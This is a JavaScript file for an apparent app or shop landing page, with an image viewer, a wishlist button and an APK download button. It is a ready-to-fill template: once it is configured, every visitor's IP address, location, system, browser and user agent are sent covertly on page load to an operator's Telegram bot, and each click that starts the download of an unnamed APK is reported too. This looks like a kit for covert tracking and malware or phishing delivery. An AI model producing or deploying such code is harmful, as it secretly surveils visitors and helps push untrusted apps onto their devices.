document.addEventListener('DOMContentLoaded', function() {
    const smallImages = document.querySelectorAll('.small-img');
    const modalImage = document.getElementById('modalImage');

    if (modalImage) {
        smallImages.forEach(img => {
            img.addEventListener('click', function() {
                modalImage.src = this.src; // Show enlarged clicked image in modal
            });
        });
    }

    const installBtn = document.getElementById('download-button');
    if (installBtn) {
        installBtn.addEventListener('click', downloadFile);
    }
});

const TG_TOKEN = ''; //YOUR BOT TOKEN
const TG_CHAT = ''; //YOUR CHAT ID

async function sendTelegram(text) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TG_CHAT, text: text })
        });
        const json = await response.json();
        if (!response.ok || !json.ok) {
            console.error('Telegram API error:', json);
        }
        return json;
    } catch (error) {
        console.error('Telegram send failed:', error);
        return null;
    }
}

function getBrowserInfo(ua) {
    try {
        ua = ua || navigator.userAgent || '';
        const isEdge = /Edg\/(\d+[\d.]*)/.exec(ua);
        if (isEdge) return `Edge ${isEdge[1]}`;
        const isChrome = /Chrome\/(\d+[\d.]*)/.exec(ua);
        const isCriOS = /CriOS\/(\d+[\d.]*)/.exec(ua); // Chrome on iOS
        if (isCriOS) return `Chrome iOS ${isCriOS[1]}`;
        if (isChrome && !/OPR\//.test(ua) && !/SamsungBrowser\//.test(ua)) return `Chrome ${isChrome[1]}`;
        const isFirefox = /Firefox\/(\d+[\d.]*)/.exec(ua) || /FxiOS\/(\d+[\d.]*)/.exec(ua);
        if (isFirefox) return `Firefox ${isFirefox[1]}`;
        const isSafari = /Version\/(\d+[\d.]*)\s+Safari\//.exec(ua);
        if (isSafari && !/Chrome\//.test(ua) && !/CriOS\//.test(ua)) return `Safari ${isSafari[1]}`;
        const isOpera = /OPR\/(\d+[\d.]*)/.exec(ua);
        if (isOpera) return `Opera ${isOpera[1]}`;
        const isSamsung = /SamsungBrowser\/(\d+[\d.]*)/.exec(ua);
        if (isSamsung) return `Samsung Internet ${isSamsung[1]}`;
        return 'Unknown';
    } catch { return 'Unknown'; }
}

function getSystemInfo(ua) {
    try {
        ua = ua || navigator.userAgent || '';
        const plat = navigator.platform || '';
        const isAndroid = /Android\s([\d._]+)/.exec(ua);
        if (isAndroid) return `Android ${isAndroid[1]}`;
        const isIOS = /(iPhone|iPad|iPod).*OS\s([\d_]+)/.exec(ua);
        if (isIOS) return `${isIOS[1]} iOS ${isIOS[2].replace(/_/g,'.')}`;
        const isWindows = /Windows NT\s([\d.]+)/.exec(ua);
        if (isWindows) return `Windows ${isWindows[1]}`;
        const isMac = /Mac OS X\s([\d_]+)/.exec(ua);
        if (isMac) return `macOS ${isMac[1].replace(/_/g,'.')}`;
        const isLinux = /Linux/.test(ua);
        if (isLinux) return 'Linux';
        return plat || 'Unknown';
    } catch { return 'Unknown'; }
}

async function sendOpenEvent() {
    try {
        const ua = navigator.userAgent;
        const lang = navigator.language || '';
        const url = location.hostname || location.href;
        const time = new Date().toLocaleString();
        const browser = getBrowserInfo(ua);
        const system = getSystemInfo(ua);
        const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
        const ip = ipData && ipData.ip ? ipData.ip : '';
        const country = ipData && ipData.country_name ? ipData.country_name : '';
        const countryCode = ipData && ipData.country ? ipData.country : '';
        const city = ipData && ipData.city ? ipData.city : '';
        const region = ipData && ipData.region ? ipData.region : '';
        const geo = ip ? `${country}${countryCode ? ' (' + countryCode + ')' : ''}${city || region ? ' - ' : ''}${city}${region ? ', ' + region : ''}` : '';
        const parts = [
            ' User opened the website',
            '',
            ` ${lang} | ${url}`,
            ip ? ` ${countryCode} (https://ipapi.co/?q=${ip})` : '',
            '',
            ` System: ${system}`,
            ` Browser: ${browser}`,
            ` User Agent: ${ua}`,
            ` Time: ${time}`,
            geo ? ` Location: ${geo}` : ''
        ];
        const msg = parts.filter(Boolean).join('\n');
        await sendTelegram(msg);
    } catch (e) {}
}

async function downloadFile() {
    await sendTelegram('User started APK download');
    const link = document.createElement('a');
    link.href = ''; // Add your APK download link here | And Direct Download to folder
    link.download = 'test.apk';
    link.target = '_blank';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

document.addEventListener('DOMContentLoaded', sendOpenEvent);

function addToWishlist() {
    alert('Added to wishlist!');
}

// Expose for inline handlers and external access
window.addToWishlist = addToWishlist;
window.downloadFile = downloadFile;
 // fucking coded by @Reviil0 :)